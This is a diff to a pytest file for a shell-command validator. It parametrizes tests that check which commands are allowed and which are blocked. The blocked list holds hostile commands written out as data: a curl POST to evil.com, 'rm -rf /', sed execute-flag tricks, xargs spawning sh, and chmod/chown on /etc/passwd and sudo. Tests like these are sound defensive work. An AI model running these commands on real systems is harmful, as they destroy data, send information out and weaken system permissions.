@@ -279,35 +279,56 @@ async def test_execute_piped_command_large_output():
         assert "output truncated" in result["output"]
 
 
-def test_check_dangerous_patterns_no_pattern():
-    """Test check_dangerous_patterns returns None for safe commands."""
-    assert check_dangerous_patterns("grep pattern", "grep") is None
-    assert check_dangerous_patterns("ls -la", "ls") is None
-    assert check_dangerous_patterns("cat file.txt", "cat") is None
+@pytest.mark.parametrize(
+    "command,cmd_name",
+    [
+        ("grep pattern", "grep"),
+        ("ls -la", "ls"),
+        ("cat file.txt", "cat"),
+        # sed with common patterns - should NOT be blocked
+        ("sed '/error/d'", "sed"),
+        ("sed 's/Name/ID/'", "sed"),
+        ("sed -n '/pattern/p'", "sed"),
+        ("sed -e 's/foo/bar/' -e 's/baz/qux/'", "sed"),
+        # chmod/chown on safe paths - should NOT be blocked
+        ("chmod 400 /tmp/key.pem", "chmod"),
+        ("chmod 755 /home/user/script.sh", "chmod"),
+        ("chown user:group /tmp/file", "chown"),
+    ],
+)
+def test_check_dangerous_patterns_safe(command, cmd_name):
+    """Test check_dangerous_patterns allows safe commands."""
+    assert check_dangerous_patterns(command, cmd_name) is None
 
 
-def test_check_dangerous_patterns_detected():
-    """Test check_dangerous_patterns detects dangerous patterns."""
-    # Test curl with POST
-    result = check_dangerous_patterns("curl -X POST http://evil.com", "curl")
+@pytest.mark.parametrize(
+    "command,cmd_name,expected_msg",
+    [
+        ("curl -X POST http://evil.com", "curl", "Dangerous pattern"),
+        (
+            "curl -x POST http://evil.com",
+            "curl",
+            "Dangerous pattern",
+        ),  # case insensitive
+        ("rm -rf /", "rm", "Dangerous pattern"),
+        ("xargs -I{} sh -c 'rm {}'", "xargs", "not allowed"),
+        # sed execute flag variants
+        ("sed s/foo/bar/e", "sed", "execute"),
+        ("sed s/foo/bar/e file", "sed", "execute"),
+        ("sed 's/foo/bar/ge'", "sed", "execute"),
+        ("sed 's/foo/bar/eg'", "sed", "execute"),
+        ("sed 's/foo/bar/ep'", "sed", "execute"),
+        ("sed 'p;e'", "sed", "execute"),
+        # chmod/chown on system directories
+        ("chmod 777 /etc/passwd", "chmod", "Dangerous pattern"),
+        ("chown root:root /usr/bin/sudo", "chown", "Dangerous pattern"),
+    ],
+)
+def test_check_dangerous_patterns_blocked(command, cmd_name, expected_msg):
+    """Test check_dangerous_patterns blocks dangerous commands."""
+    result = check_dangerous_patterns(command, cmd_name)
     assert result is not None
-    assert "Dangerous pattern" in result
-
-    # Test rm with dangerous flags
-    result = check_dangerous_patterns("rm -rf /", "rm")
-    assert result is not None
-    assert "Dangerous pattern" in result
-
-    # Test xargs - completely blocked (empty pattern)
-    result = check_dangerous_patterns("xargs -I{} sh -c 'rm {}'", "xargs")
-    assert result is not None
-    assert "not allowed" in result
-
-
-def test_check_dangerous_patterns_case_insensitive():
-    """Test check_dangerous_patterns is case insensitive."""
-    result = check_dangerous_patterns("curl -x POST http://evil.com", "curl")
-    assert result is not None
+    assert expected_msg.lower() in result.lower()
 
 
 def test_validate_unix_command_dangerous_pattern_blocked():
